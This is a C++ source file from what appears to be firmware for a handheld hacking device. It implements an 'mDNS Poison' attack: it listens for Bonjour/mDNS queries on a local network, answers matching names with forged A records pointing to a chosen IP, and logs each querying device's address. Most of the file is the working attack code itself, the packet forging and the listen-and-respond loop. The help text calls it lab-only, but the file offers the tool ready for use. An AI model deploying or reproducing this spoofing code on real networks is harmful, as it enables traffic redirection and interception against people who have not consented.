#include "mdns.h"
#if defined(EVIL_EXTENSIONS)
#include "root/app/utils.h"
#include "root/input/mykeyboard.h"
#include "root/net/wifi_common.h"
#include "root/storage/paths.h"
#include "root/storage/sd_functions.h"
#include "root/ui/display.h"
#include <WiFi.h>
#include <WiFiUdp.h>
#include <globals.h>
#include <vector>

static void mdnsPoisonHelp() {
    showAppHelp(
        {
            "Spoof Bonjour/mDNS answers",
            "on the local LAN (lab only).",
            "",
            "Needs WiFi STA.",
            "",
            "Names:",
            "  If netops/mdns/names.txt",
            "  exists, poison all labels",
            "  in that list. Else enter one",
            "  name (e.g. kvxputer.local).",
            "  Answer IP defaults to STA.",
            "",
            "Listens UDP 5353. Match in",
            "query text -> forged A record.",
            "Logs to responder/mdns_log.",
            "",
            "Screen: q=queries a=answers",
            "ESC stops. Authorized nets only.",
        }
    );
}

static void mdnsSendA(
    WiFiUDP &udp, const uint8_t *qid, const String &name, const IPAddress &spoofIp
) {
    uint8_t resp[128];
    memset(resp, 0, sizeof(resp));
    if (qid) {
        resp[0] = qid[0];
        resp[1] = qid[1];
    }
    resp[2] = 0x84;
    resp[3] = 0x00;
    resp[6] = 0x00;
    resp[7] = 0x01;
    size_t pos = 12;
    resp[pos++] = (uint8_t)name.length();
    for (size_t i = 0; i < name.length() && pos < sizeof(resp) - 20; i++) resp[pos++] = (uint8_t)name[i];
    const char *local = "local";
    resp[pos++] = 5;
    for (int i = 0; i < 5; i++) resp[pos++] = local[i];
    resp[pos++] = 0;
    resp[pos++] = 0x00;
    resp[pos++] = 0x01;
    resp[pos++] = 0x00;
    resp[pos++] = 0x01;
    resp[pos++] = 0x00;
    resp[pos++] = 0x00;
    resp[pos++] = 0x00;
    resp[pos++] = 0x78;
    resp[pos++] = 0x00;
    resp[pos++] = 0x04;
    resp[pos++] = spoofIp[0];
    resp[pos++] = spoofIp[1];
    resp[pos++] = spoofIp[2];
    resp[pos++] = spoofIp[3];
    udp.beginPacket(IPAddress(224, 0, 0, 251), 5353);
    udp.write(resp, pos);
    udp.endPacket();
}

static void mdnsPoisonRun() {
    if (!WiFi.isConnected() && !wifiConnectMenu(WIFI_STA)) return;

    FS *fs = nullptr;
    getFsStorage(fs);
    std::vector<String> names;
    if (fs && fs->exists(kvx::paths::NETOPS_MDNS_NAMES)) {
        File f = fs->open(kvx::paths::NETOPS_MDNS_NAMES, FILE_READ);
        if (f) {
            while (f.available() && names.size() < 24) {
                String line = f.readStringUntil('\n');
                line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                if (line.endsWith(".local")) line.remove(line.length() - 6);
                names.push_back(line);
            }
            f.close();
        }
    }
    if (names.empty()) {
        String name = keyboard("kvxputer.local", 48, "Spoof name");
        name.trim();
        if (name.isEmpty() || name == "\x1B") return;
        if (name.endsWith(".local")) name.remove(name.length() - 6);
        names.push_back(name);
    }

    IPAddress spoofIp = WiFi.localIP();
    String ipStr = keyboard(spoofIp.toString(), 15, "Answer IP");
    spoofIp.fromString(ipStr);

    WiFiUDP udp;
    if (!udp.begin(5353)) {
        displayError("UDP 5353 fail", true);
        return;
    }
    int queries = 0, answers = 0;
    drawMainBorderWithTitle("mDNS Poison");
    padprintln(String(names.size()) + " name(s)");
    padprintln(spoofIp.toString());
    padprintln("ESC stop (lab only)");
    EscPress = false;
    String painted;
    while (!check(EscPress) && !returnToMenu) {
        int len = udp.parsePacket();
        if (len > 0) {
            uint8_t buf[512];
            int n = udp.read(buf, sizeof(buf));
            queries++;
            String hay;
            for (int i = 0; i < n; i++) {
                if (buf[i] >= 32 && buf[i] < 127) hay += (char)buf[i];
            }
            for (const auto &name : names) {
                if (hay.indexOf(name) < 0) continue;
                mdnsSendA(udp, n >= 2 ? buf : nullptr, name, spoofIp);
                answers++;
                if (fs) {
                    kvx::paths::ensureDir(*fs, kvx::paths::NETOPS_RESPONDER);
                    File lf = fs->open(String(kvx::paths::NETOPS_RESPONDER) + "/mdns_log.txt", FILE_APPEND);
                    if (lf) {
                        lf.printf(
                            "%lu %s from %s\n",
                            (unsigned long)millis(),
                            name.c_str(),
                            udp.remoteIP().toString().c_str()
                        );
                        lf.close();
                    }
                }
            }
            String hud = "q=" + String(queries) + " a=" + String(answers);
            if (hud != painted) {
                tft.fillRect(10, 50, tftWidth - 20, 20, kvxConfig.bgColor);
                tft.drawString(hud, 10, 50);
                painted = hud;
            }
        }
        delay(10);
    }
    udp.stop();
}

void mdnsPoisonMenu() {
    options = {
        {"Help",  mdnsPoisonHelp},
        {"Start", mdnsPoisonRun },
    };
    addOptionToMainMenu();
    loopOptions(options, MENU_TYPE_SUBMENU, "mDNS Poison");
    options.clear();
}
#endif
